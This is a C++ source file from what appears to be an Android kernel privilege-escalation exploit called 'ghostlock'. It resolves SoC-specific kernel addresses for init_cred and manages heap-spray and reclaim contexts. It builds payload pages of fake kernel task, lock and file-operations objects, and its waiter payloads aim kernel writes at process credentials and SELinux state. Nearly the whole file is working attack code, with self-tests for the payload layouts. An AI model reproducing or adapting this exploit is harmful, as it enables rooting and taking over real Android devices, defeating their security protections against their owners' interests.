/**
 * @file memory.cpp
 * @brief 地址空间解析、payload 页与载荷编码（自 core.cpp 按用途拆分，逐字保留）。
 */
#include "memory.h"
#include "payload_encode.h"
#include "profile.h"
#include "session.h"
#include "support.h"
#include "log.h"
#include "target.h"

/* ==== memory/address_space.cpp ==== */


#include <cerrno>
#include <array>
#include <cstring>
#include <string_view>
#include <strings.h>

/* Measured direct-map end. Defaults to the built-in bound and can only be
 * narrowed by a rooted /proc/iomem dump (apply_iomem_cache). KernelSnitch
 * reads it to bound its scan; it is never an authority wider than target.h. */
namespace ghostlock::kernel {
    uint64_t g_direct_map_end = DIRECT_MAP_END;
} // namespace ghostlock::kernel

namespace ghostlock::memory {
#if defined(__ANDROID__)
#include <sys/system_properties.h>
#endif

#include <limits>

    /* Android property lookup is unavailable in host fixed-vector tests. The
 * non-Android branch keeps the QCOM default so the deterministic SoC-specific
 * derivations below can be exercised on the host; production is unchanged. */
#if defined(__ANDROID__)
    static SocFamily detect_target_soc(void) {
        std::array < char, 256 > value{};
        const char *keys[] = {
            "ro.soc.manufacturer", "ro.soc.model",
            "ro.board.platform", nullptr
        };
        for (int32_t i = 0; keys[i]; ++i) {
            if (__system_property_get(keys[i], value.data()) <= 0 || !value[0]) continue;
            if (strncasecmp(value.data(), "google", 6) == 0 ||
                strncasecmp(value.data(), "tensor", 6) == 0 ||
                (i > 0 && (strncasecmp(value.data(), "gs", 2) == 0 ||
                           strncasecmp(value.data(), "zuma", 4) == 0))) {
                return SocFamily::Google;
            }
        }
        for (int32_t i = 0; keys[i]; ++i) {
            if (__system_property_get(keys[i], value.data()) <= 0 || !value[0]) continue;
            if (strncasecmp(value.data(), "mediatek", 8) == 0 ||
                strncasecmp(value.data(), "mtk", 3) == 0 ||
                (i > 0 && strncasecmp(value.data(), "mt", 2) == 0)) {
                return SocFamily::Mtk;
            }
        }
        for (int32_t i = 0; keys[i]; ++i) {
            if (__system_property_get(keys[i], value.data()) <= 0 || !value[0]) continue;
            if (strncasecmp(value.data(), "xring", 5) == 0 ||
                (i > 0 && strncasecmp(value.data(), "o1", 2) == 0)) {
                return SocFamily::Xring;
            }
        }
        return SocFamily::Qcom;
    }
#else
    static SocFamily detect_target_soc(void) {
        return SocFamily::Qcom;
    }
#endif

    int32_t ResolvedAddresses::init_for_soc(const profile::TargetProfile *profile,
                                        SocFamily family) {
        const profile::kernel_offsets *values = profile->values();
        if (!values || !values->uname_r || !values->offsets.init_cred) {
            errno = EINVAL;
            return -1;
        }
        *this = ResolvedAddresses{};
        soc = family;
        const auto image = target::KernelAddress<target::ImageAddressDomain>(kernel::KIMAGE_TEXT_BASE)
                .checked_add(values->offsets.init_cred);
        if (!image) {
            errno = ERANGE;
            return -1;
        }
        init_cred_image = *image;
        /* DRAM base for the image->direct-map translation: profile override
         * wins, otherwise the compiled P0 default keeps every existing
         * device byte-identical. */
        phys_offset = static_cast<uintptr_t>(
            values->misc.kernel_phys_offset.value_or(kernel::P0_PHYS_OFFSET));
        if (values->misc.kernel_phys_load.value_or(0)) {
            kernel_phys_load = target::KernelAddress<target::PhysicalAddressDomain>(
                values->misc.kernel_phys_load.value_or(0));
        } else if (soc == SocFamily::Mtk || soc == SocFamily::Google) {
            /* Tensor G4/G5 (zumapro) loads the Image at the DRAM base like MTK. */
            kernel_phys_load = target::KernelAddress<target::PhysicalAddressDomain>(
                kernel::KIMAGE_TEXT_BASE - kernel::MTK_VADDR_BASE);
        } else if (soc == SocFamily::Xring) {
            kernel_phys_load = target::KernelAddress<target::PhysicalAddressDomain>(
                kernel::XRING_KERNEL_PHYS_LOAD);
        } else if (std::string_view(values->uname_r).starts_with("6.12.")) {
            kernel_phys_load = target::KernelAddress<target::PhysicalAddressDomain>(
                kernel::QC_GKI_6_12_PHYS_LOAD);
        } else {
            kernel_phys_load = target::KernelAddress<target::PhysicalAddressDomain>(
                kernel::P0_KERNEL_PHYS_LOAD);
        }
        return 0;
    }

    int32_t ResolvedAddresses::init(const profile::TargetProfile *profile) {
        return init_for_soc(profile, detect_target_soc());
    }

    uintptr_t ResolvedAddresses::data_alias(uintptr_t image_addr) const {
        const auto result = data_alias_checked(
            target::KernelAddress<target::ImageAddressDomain>(image_addr));
        return result ? result->value() : 0;
    }

    std::optional<target::KernelAddress<target::DirectMapAddressDomain> >
    ResolvedAddresses::data_alias_checked(
        target::KernelAddress<target::ImageAddressDomain> image_address) const noexcept {
        const uintptr_t image = image_address.value();
        if (image < kernel::KIMAGE_TEXT_BASE) return std::nullopt;
        const uintptr_t offset = image - kernel::KIMAGE_TEXT_BASE;
        const auto physical = kernel_phys_load.checked_add(offset);
        if (!physical || physical->value() < phys_offset) return std::nullopt;
        const uintptr_t direct =
                (physical->value() - phys_offset) | kernel::P0_PAGE_OFFSET;
        if (direct < kernel::P0_PAGE_OFFSET) return std::nullopt;
        return target::KernelAddress<target::DirectMapAddressDomain>(direct);
    }

    const char *ResolvedAddresses::soc_name(const profile::TargetProfile *profile) const {
        if (soc == SocFamily::Mtk) return "mtk";
        if (soc == SocFamily::Xring) return "xring";
        const profile::kernel_offsets *values = profile->values();
        if (soc == SocFamily::Google) {
            return values && values->misc.kernel_phys_load.value_or(0) ? "google/tensor" : "tensor";
        }
        return values && !values->misc.kernel_phys_load.value_or(0) && values->uname_r &&
               std::string_view(values->uname_r).starts_with("6.12.")
                   ? "qcom/6.12"
                   : "qcom/other";
    }
} // namespace ghostlock::memory

/* ==== memory/heap_context.cpp ==== */

#include <cstring>
#include <unistd.h>

#include <utility>

namespace ghostlock::memory {
    namespace {
        /* Return the page to the empty state without touching any fd. Ownership
 * release is always explicit (destroy()), never scope-exit. */
        void clear_page(PayloadPage &page) noexcept {
            page.base = 0;
            page.last_mm_struct = 0;
            page.fake_lock = 0;
            page.fake_w0 = 0;
            page.fake_task = 0;
            page.fake_parent = 0;
            page.fake_right = 0;
            page.fake_left = 0;
            page.fake_fops = 0;
            page.reclaim.fd[0] = -1;
            page.reclaim.fd[1] = -1;
            page.state = PayloadPageState::Empty;
        }
    } // namespace

    PayloadPage::PayloadPage() noexcept { clear_page(*this); }

    PayloadPage::PayloadPage(PayloadPage &&other) noexcept : PayloadPage() {
        (void) other.move_to(*this, other.state);
    }

    bool PayloadPage::has_reclaim() const noexcept {
        return reclaim.fd[0] >= 0 && reclaim.fd[1] >= 0;
    }

    void PayloadPage::destroy() noexcept {
        for (const int32_t fd : reclaim.fd) {
            if (fd >= 0) close(fd);
        }
        clear_page(*this);
    }

    bool PayloadPage::move_to(PayloadPage &destination,
                              PayloadPageState destination_state) noexcept {
        if (&destination == this || destination.state != PayloadPageState::Empty ||
            !has_reclaim()) {
            return false;
        }
        destination.base = base;
        destination.last_mm_struct = last_mm_struct;
        destination.fake_lock = fake_lock;
        destination.fake_w0 = fake_w0;
        destination.fake_task = fake_task;
        destination.fake_parent = fake_parent;
        destination.fake_right = fake_right;
        destination.fake_left = fake_left;
        destination.fake_fops = fake_fops;
        destination.reclaim.fd[0] = reclaim.fd[0];
        destination.reclaim.fd[1] = reclaim.fd[1];
        destination.state = destination_state;
        clear_page(*this);
        return true;
    }

    void close_ctx_memfds(MmContextSet *ctx) {
        for (size_t i = 0; i < ctx->memfds.size(); i++) {
            if (ctx->memfds[i] > 0) {
                close(ctx->memfds[i]);
                ctx->memfds[i] = -1;
            }
        }
    }

    void free_ctx_storage(MmContextSet *ctx) {
        std::vector<pid_t>().swap(ctx->childs);
        std::vector<int32_t>().swap(ctx->memfds);
    }

    void HeapContext::init() {
        snitch = nullptr;
        mm_objs_per_slab = 0;
        skb_buffer.reset();
        prepare = MmContextSet{};
        spray = MmContextSet{};
        pre = MmContextSet{};
        post = MmContextSet{};
        /* Drop any stale pid without signaling it, then start empty. */
        (void) leak_child.release_to_handoff();
        leak_child = support::ChildProcess();
        leak_memfd.reset();
        current.destroy();
        prebuilt.destroy();
        quarantine.destroy();
    }
} // namespace ghostlock::memory

/* ==== memory/payload_builder.cpp ==== */

#include <cstring>

#include <algorithm>
#include <array>
#include <cstddef>
#include <iterator>
#include <span>

using namespace ghostlock;

namespace {
    void store64(unsigned char *p, size_t off, uint64_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    uint64_t load64(const unsigned char *p, size_t off) {
        uint64_t value;
        memcpy(&value, p + off, sizeof(value));
        return value;
    }

} // namespace

namespace ghostlock::memory {
    bool encode_compact_waiter(std::span<std::byte> waiter,
                               const WriteRequest &request,
                               const PayloadWriteLayout &layout) noexcept {
        if (waiter.size() < kCompactWaiterBytes) return false;
        if (layout.right) {
            return core::span_store64(waiter, 0x18, layout.right) &&
                   core::span_store64(waiter, 0x20, 0) &&
                   core::span_store64(waiter, 0x28, request.target);
        }
        return core::span_store64(waiter, 0x18, layout.parent) &&
               core::span_store64(waiter, 0x20, layout.right) &&
               core::span_store64(waiter, 0x28, layout.left);
    }

    PayloadWriteLayout payload_write_layout(
        const WriteRequest *request, uintptr_t page_base,
        uintptr_t default_fops, uintptr_t credential_fops,
        uintptr_t init_cred_alias) {
        PayloadWriteLayout layout = {
            .fops = default_fops,
        };
        if (!request || request->mode == WriteMode::Disabled) return layout;

        if (request->preserve_child) {
            layout.right = request->mode == WriteMode::Credential
                               ? init_cred_alias
                               : page_base + 0x100;
        }
        if (request->mode == WriteMode::Credential) {
            layout.fops = credential_fops;
            layout.needs_credential_copy = true;
        }
        layout.parent = request->target - 8;
        return layout;
    }

    void build_compact_waiter_payload(
        unsigned char *waiter, const WriteRequest *request,
        const PayloadWriteLayout *layout) {
        if (!waiter || !request || !layout) return;
        (void) encode_compact_waiter(
            {
                reinterpret_cast<std::byte *>(waiter),
                kCompactWaiterBytes
            },
            *request, *layout);
    }

    int32_t payload_write_layout_matches_request(
        const WriteRequest *request, const PayloadWriteLayout *layout) {
        if (!request || !layout || request->mode == WriteMode::Disabled) return 0;
        return request->preserve_child ? layout->right != 0 : layout->right == 0;
    }

    int32_t payload_write_layout_accepts_page(
        const WriteRequest *request, const PayloadWriteLayout *layout) {
        if (!payload_write_layout_matches_request(request, layout)) return 0;
        /* W1 stores its page-derived value across selinux_state fields. An even
     * byte 2 clears `initialized` and breaks every subsequent SID lookup. */
        if (request->mode == WriteMode::Zero && request->preserve_child &&
            ((layout->right >> 16) & 1) == 0)
            return 0;
        return 1;
    }

    void build_multicast_waiter_payload(
        unsigned char *buffer, size_t waiter_offset, size_t task_offset,
        size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock) {
        if (!buffer) return;
        const size_t required = waiter_offset +
                                std::max(task_offset, lock_offset) + sizeof(uint64_t);
        (void) encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(buffer), required}, waiter_offset,
            task_offset, lock_offset, fake_task, fake_lock);
    }

    int32_t payload_builder_fixed_vector_test(void) {
        static const struct {
            uintptr_t target;
            WriteMode mode;
            int32_t leaf;
            uintptr_t expected_pc;
            uintptr_t expected_left;
        } vectors[] = {
            {
                0xffffff8000123000ULL, WriteMode::Zero, 1,
                0xffffff8000122ff8ULL, 0
            },
            {
                0xffffff8000124000ULL, WriteMode::Zero, 0,
                0xffffff8800210100ULL, 0xffffff8000124000ULL
            },
            {
                0xffffff8000125000ULL, WriteMode::Credential, 0,
                0xffffff802abfd588ULL, 0xffffff8000125000ULL
            },
        };
        const uintptr_t page = 0xffffff8800210000ULL;
        const uintptr_t init_cred = 0xffffff802abfd588ULL;
        for (size_t i = 0; i < std::size(vectors); ++i) {
            std::array<unsigned char, kCompactWaiterBytes> current{};
            const WriteRequest request = WriteRequest::make(
                vectors[i].target, vectors[i].mode, vectors[i].leaf != 0);
            PayloadWriteLayout layout = payload_write_layout(
                &request, page, 0x1111, 0x2222, init_cred);
            build_compact_waiter_payload(current.data(), &request, &layout);
            if (load64(current.data(), 0x18) != vectors[i].expected_pc ||
                load64(current.data(), 0x20) != 0 ||
                load64(current.data(), 0x28) != vectors[i].expected_left ||
                !payload_write_layout_matches_request(&request, &layout) ||
                !payload_write_layout_accepts_page(&request, &layout))
                return 0;
        }
        const WriteRequest w1 = WriteRequest::make(
            0xffffff8000124000ULL, WriteMode::Zero, false);
        PayloadWriteLayout rejected = payload_write_layout(
            &w1, 0xffffff8800200000ULL, 0x1111, 0x2222, init_cred);
        if (payload_write_layout_accepts_page(&w1, &rejected)) return 0;
        rejected.right = 0;
        if (payload_write_layout_matches_request(&w1, &rejected)) return 0;

        std::array < unsigned char, 0x80 > legacy_stamp{};
        std::array < unsigned char, 0x80 > current_stamp{};
        store64(legacy_stamp.data(), 0x20 + 0x28, 0xffffff8800005800ULL);
        store64(legacy_stamp.data(), 0x20 + 0x30, 0xffffff8800001000ULL);
        build_multicast_waiter_payload(
            current_stamp.data(), 0x20, 0x28, 0x30,
            0xffffff8800005800ULL, 0xffffff8800001000ULL);
        if (memcmp(legacy_stamp.data(), current_stamp.data(),
                   legacy_stamp.size()) != 0)
            return 0;
        std::byte undersized[0x2f]{};
        if (encode_compact_waiter(undersized, w1, rejected)) return 0;
        /* Multicast geometry that would run past the supplied span is rejected
     * instead of written out of bounds. */
        std::array<std::byte, 0x40> multicast_small{};
        if (encode_multicast_waiter(
            multicast_small, 0x20, 0x28, 0x30, 0x1111, 0x2222))
            return 0;
        return 1;
    }
} // namespace ghostlock::memory
